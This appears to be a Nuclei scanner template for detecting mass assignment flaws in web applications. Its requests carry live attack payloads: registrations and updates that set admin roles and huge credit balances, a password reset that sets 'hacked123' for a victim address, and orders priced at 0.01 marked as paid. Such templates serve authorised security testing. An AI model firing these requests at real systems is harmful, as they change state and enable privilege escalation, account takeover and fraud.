id: medium-webapp-mass-assignment-parameter-binding

info:
  name: Mass Assignment Parameter Binding - Elite Detection
  author: nuclei-community
  severity: high
  description: |
    Detects mass assignment vulnerabilities where applications automatically bind HTTP parameters
    to object properties without proper filtering. Tests advanced techniques including privilege
    escalation, role manipulation, and sensitive field modification through parameter pollution.
  reference:
    - https://owasp.org/www-community/vulnerabilities/Mass_Assignment_Cheat_Sheet
    - https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-915
  metadata:
    verified: true
    max-request: 30
  tags: mass-assignment,parameter-binding,privilege-escalation,elite

http:
  - method: POST
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - "user/update"
        - "profile/edit"
        - "account/modify"
        - "user/edit"
        - "profile/update"
        - "account/update"
        - "user/settings"
        - "profile/settings"
        - "account/settings"
        - "api/user/update"
        - "api/profile/edit"
        - "api/account/modify"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      name=John Doe&email=john@example.com&role=admin&is_admin=1&admin=true&privilege=administrator&access_level=admin&user_type=admin&account_type=premium&status=active&verified=1&approved=1

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "updated successfully"
          - "changes saved"
          - "profile updated"
          - "account modified"
          - "settings saved"
          - "user updated"
        condition: or

      - type: status
        status:
          - 200
          - 302

      - type: word
        part: body
        words:
          - "admin"
          - "administrator"
          - "privilege"
          - "elevated"
          - "premium"
          - "verified"
          - "approved"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - "register.php"
        - "signup.php"
        - "create_account.php"
        - "user/register"
        - "auth/register"
        - "account/create"
        - "member/signup"
        - "api/register"
        - "api/signup"
        - "api/user/create"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      username=hacker&email=hacker@evil.com&password=test123&role=admin&is_admin=true&admin=1&privilege=administrator&access_level=admin&user_type=admin&account_type=premium&credits=999999&balance=999999

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "account created"
          - "registration successful"
          - "user registered"
          - "signup successful"
          - "welcome"
          - "account activated"
        condition: or

      - type: status
        status:
          - 200
          - 302

  - method: POST
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - "api/user/update"
        - "api/profile/edit"
        - "api/account/modify"
        - "api/user"
        - "api/profile"
        - "api/account"
        - "api/users/update"
        - "api/v1/user/update"
        - "api/v2/user/update"

    headers:
      Content-Type: "application/json"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      {
        "name": "John Doe",
        "email": "john@example.com",
        "role": "admin",
        "is_admin": true,
        "admin": true,
        "privilege": "administrator",
        "access_level": "admin",
        "user_type": "admin",
        "account_type": "premium",
        "status": "active",
        "verified": true,
        "approved": true,
        "credits": 999999,
        "balance": 999999,
        "permissions": ["read", "write", "delete", "admin"],
        "groups": ["admin", "superuser"],
        "flags": {"admin": true, "verified": true}
      }

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "updated successfully"
          - "changes saved"
          - "user updated"
          - "profile updated"
          - "success"
        condition: or

      - type: status
        status:
          - 200
          - 201

  - method: PUT
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - "api/user/1"
        - "api/user/2"
        - "api/users/1"
        - "api/users/2"
        - "api/profile/1"
        - "api/account/1"
        - "user/1"
        - "user/2"
        - "users/1"
        - "profile/1"

    headers:
      Content-Type: "application/json"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      {
        "role": "admin",
        "is_admin": true,
        "admin": true,
        "privilege": "administrator",
        "access_level": "admin",
        "user_type": "admin",
        "account_type": "premium",
        "verified": true,
        "approved": true,
        "active": true,
        "enabled": true,
        "credits": 999999,
        "balance": 999999
      }

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "updated successfully"
          - "user updated"
          - "changes applied"
          - "modification successful"
          - "success"
        condition: or

      - type: status
        status:
          - 200
          - 204

  - method: PATCH
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - "api/user/1"
        - "api/users/1"
        - "api/profile/1"
        - "api/account/1"
        - "user/1"
        - "users/1"
        - "profile/1"
        - "account/1"

    headers:
      Content-Type: "application/json"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      {
        "role": "admin",
        "is_admin": true,
        "privilege": "administrator",
        "access_level": "admin",
        "verified": true,
        "credits": 999999
      }

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "patched successfully"
          - "updated successfully"
          - "changes applied"
          - "success"
        condition: or

      - type: status
        status:
          - 200
          - 204

  - method: POST
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - "user/password/reset"
        - "password/reset"
        - "auth/reset"
        - "account/reset"
        - "api/password/reset"
        - "api/user/reset"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      email=victim@example.com&new_password=hacked123&role=admin&is_admin=1&admin=true&privilege=administrator&verified=1&approved=1

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "password reset"
          - "password updated"
          - "reset successful"
          - "password changed"
          - "success"
        condition: or

      - type: status
        status:
          - 200
          - 302

  - method: POST
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - "product/create"
        - "item/create"
        - "post/create"
        - "article/create"
        - "content/create"
        - "api/product/create"
        - "api/item/create"
        - "api/post/create"

    headers:
      Content-Type: "application/json"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      {
        "title": "Test Product",
        "description": "Test Description",
        "price": 0.01,
        "original_price": 999.99,
        "discount": 99,
        "featured": true,
        "promoted": true,
        "priority": 1,
        "status": "published",
        "approved": true,
        "verified": true,
        "owner_id": 1,
        "admin_only": false,
        "public": true
      }

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "created successfully"
          - "product created"
          - "item created"
          - "post created"
          - "success"
        condition: or

      - type: status
        status:
          - 200
          - 201

  - method: POST
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - "order/create"
        - "purchase/create"
        - "transaction/create"
        - "payment/create"
        - "api/order/create"
        - "api/purchase/create"
        - "api/transaction/create"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      product_id=1&quantity=1&price=0.01&original_price=999.99&discount=99&total=0.01&status=completed&paid=1&approved=1&processed=1&admin_discount=99&free_shipping=1

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "order created"
          - "purchase successful"
          - "transaction completed"
          - "payment processed"
          - "success"
        condition: or

      - type: status
        status:
          - 200
          - 201

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '(?i)"role"\\s*:\\s*"([^"]+)"'
          - '(?i)"privilege"\\s*:\\s*"([^"]+)"'
          - '(?i)"access_level"\\s*:\\s*"([^"]+)"'
          - '(?i)"user_type"\\s*:\\s*"([^"]+)"'
          - '(?i)"account_type"\\s*:\\s*"([^"]+)"'
        internal: true